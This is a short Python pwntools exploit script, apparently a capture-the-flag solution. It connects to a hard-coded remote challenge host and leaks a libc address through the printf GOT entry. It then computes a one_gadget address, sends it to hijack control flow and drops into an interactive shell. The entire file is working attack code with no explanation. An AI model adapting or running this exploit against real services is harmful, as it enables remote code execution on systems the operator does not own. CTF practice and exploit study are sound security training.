from pwn import *

# host = '127.0.0.1'
# port = 8888
host = '35.194.194.168'
port = 6666
r = remote(host, port)

r.recvuntil(':')
# puts = 0x0000000000600ba0
printf = 0x600bb8
r.sendline(str(printf).encode())

r.recvuntil('=')
# libc = int(r.recvuntil('\n'), 16) - 0x6f690
libc = int(r.recvuntil('\n'), 16) - 0x0000000000055800
print('libc =', hex(libc))

one_gadget = libc + 0x45216
print('one_gadget =', hex(one_gadget))
# input('debug')
r.recvuntil(':')
r.sendline(str(one_gadget).encode())

r.interactive()
